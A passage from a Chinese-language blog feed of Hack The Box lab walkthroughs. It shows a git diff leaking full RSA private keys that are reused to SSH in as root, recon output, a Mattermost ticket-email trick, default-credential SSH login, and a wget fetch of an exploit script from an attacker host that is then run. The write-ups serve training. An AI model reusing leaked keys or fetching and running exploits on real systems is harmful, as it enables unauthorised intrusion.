class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">--- a/resources/integration/authcredentials.key<br>+++ b/resources/integration/authcredentials.key<br>@@ -1,28 +1,27 @@<br> -----BEGIN RSA PRIVATE KEY-----<br>-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde<br>-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i<br>-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK<br>-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+<br>-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c<br>-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH<br>-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL<br>-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD<br>-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy<br>-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM<br>-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa<br>-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB<br>-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG<br>-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41<br>-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw<br>-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW<br>-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj<br>-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS<br>-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7<br>-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX<br>-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6<br>-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie<br>-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz<br>-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw<br>-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=<br>+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN<br>+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE<br>+23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE<br>+sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s<br>+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16<br>+ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h<br>+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO<br>+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9<br>+oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM<br>+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw<br>+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x<br>+6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+<br>+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE<br>+4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0<br>+937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94<br>+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT<br>+Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4<br>+eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd<br>+i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP<br>+6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb<br>+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV<br>+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA<br>+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI<br>+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog<br>+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=<br> -----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>往下拉还会有一串密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">+-----BEGIN RSA PRIVATE KEY-----<br>+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde<br>+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i<br>+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK<br>+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+<br>+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c<br>+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH<br>+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL<br>+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD<br>+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy<br>+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM<br>+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa<br>+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB<br>+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG<br>+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41<br>+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw<br>++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW<br>+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj<br>+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS<br>+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7<br>+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX<br>+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6<br>+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie<br>+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz<br>+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw<br>+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=<br>+-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>也可能是我运气比较好，我把第一串ssh密钥中的”-“去掉并添加了一层END密钥后缀，它看起来像是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde<br>8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i<br>vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK<br>nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+<br>CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c<br>F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH<br>uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL<br>gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD<br>k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy<br>NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM<br>HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa<br>2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB<br>GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG<br>jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41<br>IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw<br>+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW<br>7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj<br>Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS<br>iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7<br>VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX<br>S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6<br>md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie<br>LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz<br>oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw<br>LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>然后我尝试去以root身份链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i isad root@10.10.10.91<br>Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>135 packages can be updated.<br>60 updates are security updates.<br><br>Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1<br>root@gitter:~<span class="hljs-comment"># </span><br>root@gitter:/<span class="hljs-comment"># cd ~</span><br>root@gitter:~<span class="hljs-comment"># cat root.txt </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Delivery</title>
    <link href="/post/HackTheBox-Delivery.html"/>
    <url>/post/HackTheBox-Delivery.html</url>
    
    <content type="html"><![CDATA[<p>Recon:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Sun Jun  5 19:47:47 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.10.222</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.222<br>Host is up (0.40s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE    SERVICE VERSION<br>22/tcp    open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>80/tcp    open     http    nginx 1.14.2<br>|_http-title: Welcome<br>|_http-server-header: nginx/1.14.2<br>8065/tcp  open     unknown<br>| fingerprint-strings: <br>|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: <br>|     HTTP/1.1 400 Bad Request<br>|     Content-Type: text/plain; charset=utf-8<br>|     Connection: close<br>|     Request<br>|   GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Accept-Ranges: bytes<br>|     Cache-Control: no-cache, max-age=31556926, public<br>|     Content-Length: 3108<br>|     Content-Security-Policy: frame-ancestors <span class="hljs-string">&#x27;self&#x27;</span>; script-src <span class="hljs-string">&#x27;self&#x27;</span> cdn.rudderlabs.com<br>|     Content-Type: text/html; charset=utf-8<br>|     Last-Modified: Sun, 05 Jun 2022 11:47:30 GMT<br>|     X-Frame-Options: SAMEORIGIN<br>|     X-Request-Id: ks5zdypuiifyudskf3r5q56hoc<br>|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.<span class="hljs-literal">false</span><br>|     Date: Sun, 05 Jun 2022 12:00:34 GMT<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;</span>&gt;&lt;meta name=<span class="hljs-string">&quot;robots&quot;</span> content=<span class="hljs-string">&quot;noindex, nofollow&quot;</span>&gt;&lt;meta name=<span class="hljs-string">&quot;referrer&quot;</span> content=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=<span class="hljs-string">&quot;mobile-web-app-capable&quot;</span> content=<span class="hljs-string">&quot;yes&quot;</span>&gt;&lt;meta name=<span class="hljs-string">&quot;application-name&quot;</span> content=<span class="hljs-string">&quot;Mattermost&quot;</span>&gt;&lt;meta name=<span class="hljs-string">&quot;format-detection&quot;</span> content=<span class="hljs-string">&quot;telephone=no&quot;</span>&gt;&lt;<span class="hljs-built_in">link</span> re<br>|   HTTPOptions: <br>|     HTTP/1.0 405 Method Not Allowed<br>|     Date: Sun, 05 Jun 2022 12:00:35 GMT<br>|_    Content-Length: 0<br>64013/tcp filtered unknown<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Jun  5 20:02:22 2022 -- 1 IP address (1 host up) scanned in 874.97 seconds</span><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://delivery.htb        <br>http://delivery.htb [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.222], JQuery, Script, Title[Welcome], nginx[1.14.2]<br></code></pre></td></tr></table></figure><p><a href="mailto:&#106;&#x61;&#x6e;&#101;&#64;&#x75;&#x6e;&#x74;&#x69;&#x74;&#108;&#x65;&#100;&#x2e;&#116;&#x6c;&#x64;">&#106;&#x61;&#x6e;&#101;&#64;&#x75;&#x6e;&#x74;&#x69;&#x74;&#108;&#x65;&#100;&#x2e;&#116;&#x6c;&#x64;</a>，80端口会有两个链接：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220605200821939.png" alt="image-20220605200821939"></p><p>说是注册就能访问它们的服务器。点击之后会跳转到8065端口，会有一个注册功能。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220605201105332.png" alt="image-20220605201105332"></p><p>但是注册后需要验证，而我没办法验证。不过能找到80端口的另一个页面：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220605202304189.png" alt="image-20220605202304189"></p><p>可以新建一个票证，牢记这个Id:</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220605204400981.png" alt="image-20220605204400981"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">2701741</span><br></code></pre></td></tr></table></figure><p>用这个ID去8065端口注册：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220605204702214.png" alt="image-20220605204702214"></p><p>进去之后是一顿教程，教程完后在页面还会有一个root用户说了一些信息：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220605205042817.png" alt="image-20220605205042817"></p><p>它们在用默认凭据，可以尝试登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh maildeliverer@10.10.10.222              <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.222 (10.10.10.222)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:AGdhHnQ749stJakbrtXVi48e6KTkaMj/+QNYMW+tyj8.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.222<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">maildeliverer@10.10.10.222&#x27;</span>s password: <br>Linux Delivery 4.19.0-13-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5<br>maildeliverer@Delivery:~$ <br></code></pre></td></tr></table></figure><p>即使有密码也无法sudo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">maildeliverer@Delivery:~$ sudo -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> maildeliverer: <br>Sorry, user maildeliverer may not run sudo on Delivery.<br>maildeliverer@Delivery:~$<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">maildeliverer@Delivery:~$ wget http://10.10.16.8:85/CVE-2021-2043.py<br>--2022-06-05 08:55:24--  http://10.10.16.8:85/CVE-2021-2043.py<br>Connecting to 10.10.16.8:85... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: ‘CVE-2021-2043.py’<br><br>CVE-2021-2043.py        100%[==============================&gt;]   3.37K  20.4KB/s    <span class="hljs-keyword">in</span> 0.2s    <br><br>2022-06-05 08:55:26 (20.4 KB/s) - ‘CVE-2021-2043.py’ saved [3448/3448]<br><br>maildeliverer@Delivery:~$ <span class="hljs-built_in">ls</span><br>CVE-2021-2043.py  user.txt<br>maildeliverer@Delivery:~$ <span class="hljs-built_in">chmod</span> +x CVE-2021-2043.py <br>maildeliverer@Delivery:~$ ./CVE-2021-2043.py<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Curling</title>
    <link href="/post/HackTheBox-Curling.html"/>
    <url>/post/HackTheBox-Curling.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)<br>|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)<br>|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Home<br>|_http-generator: Joomla! - Open Source Content Management<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.65 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://10.10.10.150 <br>http://10.10.10.150 [200 OK] Apache[2.4.29], Bootstrap, Cookies[c0548020854924e0aecd05ed9f5b672b], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[c0548020854924e0aecd05ed9f5b672b], IP[10.10.10.150], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], 